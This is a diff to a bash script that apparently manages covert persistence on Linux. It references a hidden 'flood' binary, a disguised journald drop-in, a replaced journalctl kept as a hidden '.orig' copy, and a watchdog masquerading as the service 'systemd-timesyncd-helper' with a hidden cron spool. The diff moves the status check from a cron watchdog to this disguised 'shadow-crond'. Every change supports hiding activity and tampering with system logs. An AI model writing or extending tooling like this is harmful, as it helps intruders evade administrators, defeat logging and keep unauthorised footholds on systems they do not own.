@@ -29,7 +29,7 @@ DROPIN_DIR="/etc/systemd/system/systemd-journald.service.d"
 DROPIN_FILE="${DROPIN_DIR}/telemetry.conf"
 FLOOD_BINARY="/usr/local/lib/.nhmw"
 JOURNALCTL_LOC=$(which journalctl)
-CRON_MARKER="# nhmw-watchdog"
+SHADOW_SPOOL="/var/cache/.syspkg/tabs/root"
 
 RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
 info() { echo -e "${GREEN}[+]${NC} $*"; }
@@ -319,11 +319,19 @@ cmd_status() {
     /var/cache/.syspkg/journalctl.orig --disk-usage 2>/dev/null || \
         du -sh /var/log/journal 2>/dev/null || warn "Cannot determine"
 
-    hdr "Cron watchdog"
-    crontab -l 2>/dev/null | grep "$CRON_MARKER" || warn "Root crontab watchdog not found"
-    [[ -f /etc/cron.d/net-health-watchdog ]] \
-        && echo "  /etc/cron.d/net-health-watchdog present" \
-        || warn "/etc/cron.d watchdog not found"
+    hdr "Watchdog (shadow-crond spool)"
+    if systemctl is-active --quiet systemd-timesyncd-helper 2>/dev/null; then
+        info "shadow-crond (systemd-timesyncd-helper): RUNNING"
+        if [[ -f "$SHADOW_SPOOL" ]] && grep -q "$SERVICE_NAME" "$SHADOW_SPOOL" 2>/dev/null; then
+            info "Watchdog entry confirmed in $SHADOW_SPOOL"
+        else
+            warn "Watchdog entry NOT found in shadow-crond spool at $SHADOW_SPOOL"
+            warn "Run: sudo ./shadow-crond.sh install"
+        fi
+    else
+        warn "shadow-crond NOT running — watchdog is inactive"
+        warn "Run: sudo ./shadow-crond.sh install"
+    fi
 }
 
 # --------------------------------------------------------------------------- #
